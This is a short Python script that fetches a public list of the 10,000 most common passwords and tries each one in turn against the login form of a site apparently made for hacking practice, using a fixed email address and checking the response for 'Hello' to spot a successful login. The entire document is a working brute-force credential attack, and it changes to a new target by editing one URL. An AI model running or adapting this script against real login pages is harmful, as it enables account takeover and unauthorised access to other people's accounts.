# install requests

import requests


list_of_password = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt').text


URL = "https://hack-yourself-first.com/Account/Login"
EmailUser = "mekifh@rishon.il"

for guess in list_of_password.split('\n'):
    print(f"Trying .....{guess}")
    http = requests.post(URL, data={'Email':EmailUser, 'Password':guess})
    content = http.text
    if 'Hello' in content:
        print(f"Success!! the password is : {guess}")
        break
